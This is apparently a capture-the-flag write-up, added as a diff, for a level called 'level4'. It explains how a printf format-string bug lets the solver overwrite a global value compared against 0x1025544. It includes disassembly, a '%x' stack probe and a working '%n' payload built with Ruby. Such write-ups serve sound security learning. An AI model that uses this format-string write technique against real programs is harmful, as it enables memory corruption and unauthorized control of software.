@@ -1,0 +1,16 @@
+We can see a call to printf in function p.
+In function n we can see that there is a cmp done right after the call to function p.
+    0x08048488 <+49>:    call   0x8048444 <p>
+    0x0804848d <+54>:    mov    0x8049810,%eax
+    0x08048492 <+59>:    cmp    $0x1025544,%eax
+
+We will try to use a printf vulnerability to modify the value compared with the constant $0x1025544 (16930116).
+We will print registers to find the register where our value is stored.
+    $ ruby -e 'print "aaaa" + "%x " * 12' > /tmp/buffer
+    $ cat /tmp/buffer - | ./level4
+    $ aaaab7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 61616161
+We can see that our value will be stored in the 12th register so we will try to modify the value stored here.
+With '%16930112x' we will display 16930112 bytes. To that will be added the 4 bytes of the address.
+
+$ ruby -e 'print "\x10\x98\x04\x08" + "%16930112x%12\$n"' > /tmp/buffer
+$ cat /tmp/buffer - | ./level4
